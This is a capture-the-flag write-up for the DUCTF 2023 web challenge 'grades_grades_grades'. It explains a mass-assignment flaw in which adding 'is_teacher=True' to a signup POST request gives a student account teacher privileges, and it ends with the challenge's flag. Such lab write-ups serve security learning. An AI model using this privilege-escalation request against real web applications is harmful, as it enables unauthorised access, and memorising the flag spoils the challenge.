# grades\_grades\_grades (easy)
Sign up and see those grades :D! How well did you do this year's subject? Author: donfran

https://web-grades-grades-grades-c4627b227382.2023.ductf.dev

## Files
grades\_grades\_grades.tar.gz

## Solution
The website brings us to page where we can sign up and got shown some grades. Typing in random data shows the following:
[Logged in](images/grades_grades_grades_0.png)

We can see that we got the Student Role _Student_ assigned.

Taking a look at the source code (auth.py), we can see that the site generates a JWT Token to authenticate ourself:
```python
def create_token(data):
    token = jwt.encode(data, SECRET_KEY, algorithm='HS256')
    return token

def token_value(token):
    decoded_token = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
    return decoded_token['stu_num'], decoded_token['stu_email'], decoded_token.get('is_teacher', False)

[...]
```
We have no choice to enter our role, but it seems to be generated under the key `is_teacher`.

If we look fourther we find the following function:
```python
def is_teacher_role():
    # if user isn't authed at all
    if 'auth_token' not in request.cookies:
        return False
    token = request.cookies.get('auth_token')
    try:
        data = decode_token(token)
        if data.get('is_teacher', False):
            return True
    except jwt.DecodeError:
        return False
    return False
```
This means, that if the key isn't set, it returns `False`.

In the routes.py this function is called to check our role:
```python
[...]

def signup():

    # make sure user isn't authenticated
    if is_teacher_role():
        return render_template('public.html', is_auth=True, is_teacher_role=True)
    elif is_authenticated():
        return render_template('public.html', is_auth=True)

[...]
```

Since we can't manipulate the JWT Token, because the encryption is pretty safe, we could just set the key in the POST request. With BurpSuit we can generate the following request:
```
POST /signup HTTP/2
Host: web-grades-grades-grades-c4627b227382.2023.ductf.dev

[...]

stu_num=test1&stu_email=test%40test&password=test&is_teacher=True
```
The website responses with `/?is_auth=True` and show up the already known interface, but with the _Teacher_ role:
[Teacher Role](images/grades_grades_grades_1.png)

Know we have another tab called 'GRADING TOOL'. Here we can find our flag: `DUCTF{Y0u_Kn0W_M4Ss_A5s1GnM3Nt_c890ne89c3}`
[Flag](images/grades_grades_grades_2.png)
